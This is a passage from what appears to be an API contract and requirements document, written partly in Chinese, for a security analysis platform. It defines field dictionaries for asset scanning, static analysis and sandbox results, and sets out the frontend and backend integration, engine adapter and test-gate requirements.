| `INTERNAL_ERROR` | 内部服务错误 |

## 8. 字段字典

### 8.1 通用字段

| 字段 | 含义 |
| --- | --- |
| `task_id` | 任务唯一标识 |
| `task_type` | 任务类型 |
| `engine_type` | 引擎类型 |
| `status` | 任务或结果状态 |
| `risk_level` | 风险等级 |
| `summary` | 摘要描述 |
| `created_at` | 创建时间 |
| `updated_at` | 更新时间 |
| `started_at` | 开始时间 |
| `finished_at` | 完成时间 |
| `metadata` | 扩展字段 |

### 8.2 资产测绘字段

| 字段 | 含义 |
| --- | --- |
| `target` | 资产目标对象 |
| `fingerprint` | 指纹识别结果 |
| `confidence` | 指纹识别置信度 |
| `matched_features` | 命中的特征列表 |
| `open_ports` | 开放端口列表 |
| `http_endpoints` | HTTP 端点列表 |
| `auth_detected` | 是否检测到认证机制 |
| `findings` | 风险发现列表 |

### 8.3 静态分析字段

| 字段 | 含义 |
| --- | --- |
| `sample_name` | 样本或 Skills 包名称 |
| `language` | 主语言 |
| `entry_files` | 入口文件列表 |
| `files_scanned` | 已扫描文件数量 |
| `rule_hits` | 规则命中明细 |
| `rule_id` | 规则 ID |
| `rule_name` | 规则名称 |
| `severity` | 命中严重度 |
| `file` | 命中文件 |
| `line_start` | 起始行号 |
| `line_end` | 结束行号 |
| `reason` | 命中原因 |
| `sensitive_capabilities` | 敏感能力集合 |
| `dependency_summary` | 依赖摘要 |

### 8.4 动态沙箱字段

| 字段 | 含义 |
| --- | --- |
| `session_id` | 沙箱执行会话 ID |
| `alerts` | 告警列表 |
| `alert_id` | 告警 ID |
| `event_type` | 运行时事件类型 |
| `action` | 平台或沙箱采取的动作 |
| `resource` | 被访问的资源 |
| `evidence` | 证据列表 |
| `timestamp` | 告警时间 |
| `reason` | 告警原因 |
| `blocked` | 是否发生阻断 |
| `event_count` | 会话内事件总数 |
| `policy_id` | 命中的策略 ID |
| `policy_name` | 命中的策略名称 |

## 9. 后续演进建议

### 9.1 当前第一版契约解决了什么问题

- 明确了以 `Task` 为核心的主流程，便于前后端和引擎先围绕同一生命周期协作。
- 统一了三类任务的状态枚举、风险等级和结果外层结构。
- 为前端页面联调提供了稳定的查询对象和响应格式。
- 为后端任务中心、结果中心、日志中心提供了第一版数据边界。

### 9.2 当前版本暂时不做什么

- 不定义复杂筛选、分页和排序协议
- 不定义权限系统和多租户模型
- 不定义批量任务和批量结果下载协议
- 不固定引擎回调接口或消息队列协议
- 不设计报表导出、通知中心、工作流审批等平台扩展能力

### 9.3 后续可扩展方向

- WebSocket 或 SSE 实时日志推送
- 引擎回调机制和异步结果上报接口
- 批量任务创建与批量结果查询
- 报告导出接口
- 权限系统、审计系统和操作留痕
- 任务取消、重试、重新执行接口
- 风险标签体系、规则管理体系和基线对比能力
- 分页查询任务列表与结果列表

## 10. 实施建议

为了尽快把本契约落到代码中，建议按以下顺序推进：

1. 在 `shared/contracts` 中定义本文件对应的 TypeScript 接口与运行时规范化函数。该步骤已在 `REQ-01` 中完成第一版落地。
2. 在 `backend` 中先实现任务创建、任务查询和结果查询的 mock API。
3. 在 `engines/*` 中为三类结果各准备一份样例 JSON。
4. 在前端先基于 `Task`、`RiskSummary` 和三类结果对象完成静态页面联调。

以上步骤完成后，再进入引擎实际接入与状态流转细化阶段。
## REQ-06 Frontend Integration Baseline

当前前端最小联调闭环已经消费以下后端路径：

- `GET /api/tasks`
- `GET /api/tasks/:taskId`
- `GET /api/tasks/:taskId/result`
- `GET /api/tasks/:taskId/risk-summary`

前端 service 层默认采用 `api-preferred` 模式：

- 优先请求 backend tasks API
- 若接口不可用、响应不合法或本地未启动后端，则回退到 frontend mock 数据
- 测试或纯前端隔离场景可使用 `mock-only` 模式，避免真实网络请求

页面数据流约定如下：

- Tasks page 通过 `GET /api/tasks` 获取任务列表，并使用 `shared` 契约规范化为 `Task[]`
- Task detail page 并行获取任务详情、统一结果外壳和风险摘要，并在前端合成为稳定页面模型
- 所有联调数据都必须先经过 `shared/contracts/*` 归一化，再进入 React 页面和组件

本地开发环境下，frontend dev server 通过 Vite proxy 将 `/api` 与 `/health` 转发到 `http://127.0.0.1:3000`。
## REQ-07 Backend Engine Adapter Baseline

本 requirement 不新增新的对外 HTTP 路由，但补充 backend 内部稳定的引擎接入边界，供后续真实引擎实现复用。

当前 backend 内部保留的稳定 handoff 对象为：

- `EngineDispatchTicket`
  - `task_id`
  - `task_type`
  - `engine_type`
  - `payload`

当前三类任务预留的 dispatch payload 形状如下：

- `asset_scan` -> `{ target, scan_parameters }`
- `static_analysis` -> `{ target, analysis_parameters }`
- `sandbox_run` -> `{ target, runtime_parameters }`

平台在真实引擎输出返回前，仍以统一壳子持有初始状态：

- `Task`
- `BaseResult`
- `RiskSummary`

`TaskEngineService.createInitialArtifacts(task)` 会基于 adapter 生成三类任务的初始结果细节，但这些 adapter payload 属于 backend 内部契约，不应直接暴露给 frontend。
## REQ-08 Frontend Contract Health States

The frontend integration layer uses four source states when reading the existing tasks API:

- `api`: every payload required by the current page passed shared contract normalization.
- `degraded`: the backend returned a valid `Task`, but dependent payloads such as `result` or `risk-summary` had to be synthesized locally.
- `integration-error`: the backend responded, but at least one required payload failed shared contract normalization, so the UI fell back to mock-backed data instead of claiming a healthy backend connection.
- `mock`: the frontend is intentionally running in `mock-only` mode, or the backend is unavailable.

This distinction is part of the local integration contract because contract-invalid responses must stay visible during platform skeleton development instead of being misreported as healthy backend API data.
## REQ-09 Repository Contract Verification Gate

The repository-level contract verification gate now has one canonical full-stack entry:

- `npm run test`
- `npm run test:all`

Both commands are expected to cover all current contract consumers:

- repository script-definition checks
- shared contract tests
- backend unit and integration tests
- frontend rendering and integration tests

This rule exists so a green root test run means the current platform skeleton is green across shared, backend, and frontend boundaries instead of only across a subset of the repository.

## REQ-10 Frontend Data Source Indicator Scope

Frontend data-source indicators are page-scoped status signals, not global layout state.

- `Backend API`
- `Degraded API Data`
- `Integration Error`
- `Mock Fallback`

These labels should only appear inside pages or page-level sections that have actually resolved their own data source. The shared console layout header must stay neutral so it does not conflict with page-specific integration state.
